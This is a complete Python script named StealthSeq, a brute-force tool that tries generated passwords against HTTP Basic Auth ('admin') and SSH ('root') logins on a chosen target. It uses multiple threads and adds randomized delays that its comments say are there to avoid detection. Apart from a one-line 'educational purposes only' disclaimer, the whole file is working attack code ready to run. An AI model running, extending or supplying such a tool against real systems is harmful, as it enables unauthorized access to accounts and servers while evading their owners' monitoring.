#!/usr/bin/env python3
# StealthSeq - Advanced Sequential Pattern Brute Forcer
# Note: For educational purposes only. Unauthorized use is illegal.

import sys
import time
import random
import socket
import argparse
from itertools import product
from concurrent.futures import ThreadPoolExecutor

class StealthSeq:
    def __init__(self):
        self.banner = """
        ███████╗████████╗███████╗ █████╗ ██╗  ██╗████████╗██╗  ██╗███████╗██████╗ 
        ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║  ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
        ███████╗   ██║   █████╗  ███████║███████║   ██║   ███████║█████╗  ██████╔╝
        ╚════██║   ██║   ██╔══╝  ██╔══██║██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
        ███████║   ██║   ███████╗██║  ██║██║  ██║   ██║   ██║  ██║███████╗██║  ██║
        ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
        """
        self.args = self.parse_args()
        self.counter = 0
        self.found = False
        self.delay = self.args.delay
        self.jitter = self.args.jitter
        self.timeout = self.args.timeout
        
    def parse_args(self):
        parser = argparse.ArgumentParser(description="StealthSeq - Advanced Sequential Pattern Brute Forcer")
        parser.add_argument("-t", "--target", help="Target URL or IP with port (e.g., http://target.com:8080)")
        parser.add_argument("-p", "--protocol", choices=["http", "ftp", "ssh", "custom"], default="http", help="Protocol to target")
        parser.add_argument("-c", "--charset", default="abcdefghijklmnopqrstuvwxyz0123456789", help="Character set to use")
        parser.add_argument("-min", "--min-length", type=int, default=4, help="Minimum length of generated patterns")
        parser.add_argument("-max", "--max-length", type=int, default=6, help="Maximum length of generated patterns")
        parser.add_argument("-d", "--delay", type=float, default=0.5, help="Base delay between attempts (seconds)")
        parser.add_argument("-j", "--jitter", type=float, default=0.3, help="Random jitter to add to delay")
        parser.add_argument("-T", "--timeout", type=float, default=5.0, help="Connection timeout")
        parser.add_argument("-w", "--workers", type=int, default=3, help="Number of worker threads")
        parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
        return parser.parse_args()
    
    def generate_patterns(self):
        """Generate sequential patterns from charset"""
        for length in range(self.args.min_length, self.args.max_length + 1):
            for attempt in product(self.args.charset, repeat=length):
                yield ''.join(attempt)
    
    def random_delay(self):
        """Add random delay with jitter to avoid detection"""
        delay = self.delay + random.uniform(0, self.jitter)
        if self.args.verbose:
            print(f"[*] Sleeping for {delay:.2f}s")
        time.sleep(delay)
    
    def http_brute(self, pattern):
        """HTTP Basic Auth brute force example"""
        import requests
        from requests.auth import HTTPBasicAuth
        
        if self.found:
            return
            
        self.random_delay()
        
        try:
            url = self.args.target
            if not url.startswith("http"):
                url = f"http://{url}"
                
            resp = requests.get(url, auth=HTTPBasicAuth('admin', pattern), timeout=self.timeout)
            if resp.status_code == 200:
                self.found = True
                print(f"\n[+] SUCCESS! Found credentials: admin:{pattern}")
                print(f"    Response code: {resp.status_code}")
                return True
                
        except Exception as e:
            if self.args.verbose:
                print(f"[-] Attempt {pattern} failed: {str(e)}")
        return False
    
    def ssh_brute(self, pattern):
        """SSH brute force example"""
        import paramiko
        
        if self.found:
            return
            
        self.random_delay()
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            target, port = self.args.target.split(":") if ":" in self.args.target else (self.args.target, 22)
            
            ssh.connect(target, port=int(port), username='root', password=pattern, timeout=self.timeout, banner_timeout=30)
            self.found = True
            print(f"\n[+] SUCCESS! Found credentials: root:{pattern}")
            ssh.close()
            return True
            
        except Exception as e:
            if self.args.verbose and "Authentication failed" not in str(e):
                print(f"[-] Attempt {pattern} failed: {str(e)}")
        return False
    
    def run(self):
        print(self.banner)
        print("[*] Starting StealthSeq brute forcer")
        print(f"[*] Target: {self.args.target}")
        print(f"[*] Protocol: {self.args.protocol}")
        print(f"[*] Pattern length: {self.args.min_length}-{self.args.max_length}")
        print(f"[*] Using charset: {self.args.charset}")
        print(f"[*] Workers: {self.args.workers}")
        print(f"[*] Delay: {self.args.delay}s ± {self.args.jitter}s\n")
        
        try:
            with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
                for pattern in self.generate_patterns():
                    if self.found:
                        break
                        
                    self.counter += 1
                    if self.counter % 10 == 0:
                        print(f"\r[*] Attempts: {self.counter}", end="", flush=True)
                    
                    if self.args.protocol == "http":
                        executor.submit(self.http_brute, pattern)
                    elif self.args.protocol == "ssh":
                        executor.submit(self.ssh_brute, pattern)
                    # Add other protocol handlers here
                        
        except KeyboardInterrupt:
            print("\n[!] Received keyboard interrupt, shutting down...")
        
        print(f"\n[*] Total attempts: {self.counter}")
        if not self.found:
            print("[-] No credentials found")

if __name__ == "__main__":
    tool = StealthSeq()
    tool.run()
